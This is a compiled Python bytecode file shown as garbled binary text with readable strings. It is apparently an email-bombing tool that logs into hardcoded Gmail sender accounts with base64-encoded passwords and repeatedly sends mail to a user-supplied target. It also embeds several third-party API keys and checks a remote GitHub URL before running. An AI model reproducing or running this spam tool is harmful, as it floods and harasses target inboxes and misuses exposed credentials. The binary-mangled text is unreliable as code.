a
    ภ๘aa  ใ                	   @   s  d Z dZdZdZddlZddlZddlZddlZddlZddl	Z	ddl
Z
ddlZddlZddlZddlZddlZddlZddlZddlZg ZdZdZdZdd	 Zd
Zd
Zd
ZdZdZdZdZe dก e  e dก G dd dZG dd dZdd Z e dก e!ej"d  e!ej#d  zNe$ej#d ej% Ze!d e!d e!d e!d e!d e!d e!d e!d e!d  e!ej#d! ej%  e$ej#d" ej% Z&e&d#ksะe&d$ksะe&d%ksะe&d&krึd'Z'nd(Z'e' (d)กZ)e *e)กZ+e+ ,d)กZ-e$ej"d* ej% Z.e!ej/d+ ej%  e$ej/d, ej% Zg d-ขZ0e 1e0กZ2e 3e2กj4ZdZ5d.e& d/ e d0 e Z6W n0 e7y    e!ej8d1 ej%  e 9ก  Y n0 ed2ksjed3ksjed4ksjed5ksjed6ksjed7ksjed8ksjed9ksjedksjed:ksjed;ksjed<ksjed=ksjed>ksjed?ksjed@ksjedAksjedBksjedCksjedDkr~e   e!ej#dE e& dF e.  e :dGeกZe ;ก  ze <e&e-ก W n ej=yฬ   e 9ก  Y n0 e>dHD ]Z?z>e @e&e.e6ก e!ej#dI eAe5dH  dJ ej%  e5dH7 Z5W nH e7yH   e!ej8dK ej%  e 9ก  Y n   e!ej8dL  Y n0 qึe Bก  e!ej8dM  ne!ej8dN  e 9ก  dS )O๚[31m๚[32m๚[36m๚[0m้    Nฺ z1.1.0c               
   C   sr  d} zt  | ก}|j}|dkrา|j}| ก }t|krlttd t d t d d  ttd t d  ndttd t	 d	 t d d  tt	d
 t d  tt	d
 t d  tt	d
 t d  t
 ก  nNttd t	 d |ก t d d  tt	d
 t d  tt	d
 t d  W nJ tyl } z0tdt	 d t d t t|  W Y d }~n
d }~0 0 d S )NzKhttps://raw.githubusercontent.com/mishakorzik/Email-Spammer/main/src/.start้ศ   ๚[z Succesful ๚]ฺ
z[+] z3System configuration checked! There are no failuresz Failed z[-] z-Error code: 106 DNS server refused to connectz0Error code: 503 Service Unavailable! Retry-Afterz'Please wait while we fix the problem...z Status : {} zThe system failed to start!z&Error code: 401 the server cannot bootz[-]zE Critical Error code: 105 Maybe you dont have internet - Exception : )ฺrequestsฺgetZstatus_codeฺtextฺstripฺsystemRฺprintฺCฺGฺRฺsysฺexitฺformatฺ	ExceptionฺWฺstr)Zsys_urlZsys_rqstZsys_scZ
github_sysฺeฉ r   ๚k.pyฺ	sys_check   s(    
  
&r   Z587Z465zThis is spam!Zgmailฺclearc                   @   s    e Zd ZdZdZdZdZdZdS )ฺbcolors๚[92m๚[93m๚[91mr   ๚[94mN)ฺ__name__ฺ
__module__ฺ__qualname__ฺOKGREENฺWARNINGฺFAILฺENDCฺLITBUr   r   r   r   r   H   s
   r   c                   @   sH   e Zd ZdZdZdZdZdZdZdZ	dZ
d	Zd
ZdZdZdZdZdZdS )ฺFGz[30mr   r   z[33mz[34mz[35mr   z[37mz[90mr"   r    r!   r#   z[95mz[96mN)r$   r%   r&   ZblackZredZgreenZorangeZblueZpurpleZcyanZ	lightgreyZdarkgreyZlightredZ
lightgreenZyellowZ	lightblueZpinkZ	lightcyanr   r   r   r   r,   O   s   r,   c                   C   s   t  dก ttjd  d S )Nr   zW                            																											
[>] Preparing and attacking ...)ฺosฺsystemr   r   r'   r   r   r   r   ฺ
start_bomb`   s    
r/   uร  

โโโโโโ  โโโโ โโโโโ โโโ       โโโ  โโโ      โโโโโโ  โโโโโโ   โโโ       โโโโ โโโโโ
โโ   โ โโโโโโโ โโโโโโโโโ    โโโโ โโโโ    โโโ    โ โโโโ  โโโโโโโโโ    โโโโโโโ โโโ
โโโโ   โโโ    โโโโโโโ  โโโ  โโโโ โโโโ    โ โโโโ   โโโโ โโโโโโโ  โโโ  โโโ    โโโโ
โโโ  โ โโโ    โโโ โโโโโโโโโ โโโโ โโโโ      โ   โโโโโโโโโโ โโโโโโโโโโ โโโ    โโโ
โโโโโโโโโโโ   โโโโ โโ   โโโโโโโโ โโโโโโโโโโโโโโโโโโโโโ โ  โ โโ   โโโโโโโโ   โโโโ
โโ โโ โโ โโ   โ  โ โโ   โโโโโโ  โ  โโโ  โโ โโโ โ โโโโโ โ  โ โโ   โโโโโ โโ   โ  โ
 โ โ  โโ  โ      โ  โ   โโ โ โ โโ  โ โ  โโ โโ  โ โโโ โ       โ   โโ โโ  โ      โ
   โ   โ      โ     โ   โ    โ โ  โ  โ   โ  โ  โ  โโ         โ   โ   โ      โ
   โ  โ       โ         โ  โ โ       โ  โ      โ                 โ  โ       โuC  												       
[95mSelect Mail Service:													
[1] Gmail/MailRu  -  powered google          By mishakorzik						
[2] Yahoo/Yahoo    -  powered microsoft         Version 1.1.27
[3] Outlook/Hotmail -  powered microsoft         Copyring ยฉ 2021
[4] Rambler/Aol      -  powered rambler/aol        Tranks for installzMail Server: z1. smtp0python@gmail.comz2. smtp1python@gmail.comz3. smtp2python@gmail.comz4. smtp3python@gmail.comz5. smtp4python@gmail.comz6. smtp5python@gmail.comz7. smtp6python@gmail.comz8. smtp7python@gmail.comz9. smtp8python@gmail.comzexample: smtp0python@gmail.comzSelect email: zsmtp3python@gmail.comzsmtp4python@gmail.comzsmtp6python@gmail.comzsmtp7python@gmail.comzc210cDAwMHB5dGhvbjFnbWFpbA==Zc210cDBweXRob24xOGdtYWlsฺasciiz	Send To: z9Warning! Data can be sent with a delay of 1 to 5 minutes.zSubject (Optional): )zWhttps://api.ipdata.co/?api-key=6818a70bf0dcdbf1dd6bf89e62299740a49725ac65ff8e4056e3b343zWhttps://api.ipdata.co/?api-key=7d9bf69a54c63b6f9274c6074b2f50aee46208d10a33533452add840zWhttps://api.ipdata.co/?api-key=6453632fcabd2a4c2de4bb45ab35254594fd719e61d58bacde4429f0zWhttps://api.ipdata.co/?api-key=6aed0320c458287bdc453ce543c6edc565fd098eda4a79f7e41b3b61zFrom: z

Subject: r
   z
Canceled! Quiting ...ฺ1Z01ฺ2Z02ฺ3Z03ฺ4Z04ZGmailZmailruZMailruZoutlookZOutlookZyahooZYahooZramblerZRamblerZaolZAolzEmail: z
  Target: zsmtp.gmail.com้   zSuccessfully messenge sent! z emailsz
Terminaling...zMessange failed to Send! z'Proccess Terminated! Please restart ...zHWorks only with Gmail, MailRU, Rambler, Aol, Yahoo, Outlook and Hotmail.)Cr   r   r   r   ฺtimer-   ZcsvZrandomr   Zjsonฺargparser   ฺ
subprocessZsubpZsmtplibZgetpassฺbase64ฺrowฺinfoฺresultr   r   Z
GMAIL_PORTZ
YAHOO_PORTZOUTLOOK_PORTZYANDEX_PORTZsubjectฺbodyZserverr.   r   r,   r/   r   r'   r(   ฺinputr*   ฺuserZbase64_messageฺencodeZbase64_bytesZ	b64decodeZmessage_bytesฺdecodeฺpwdฺtor+   Zipdata_listZchoiceZipdatar   r   ZnoฺmessageฺKeyboardInterruptr)   r   ZSMTPZstarttlsZloginZSMTPAuthenticationErrorฺrangeฺiZsendmailr   ฺcloser   r   r   r   ฺ<module>   sธ   !


(



ศ$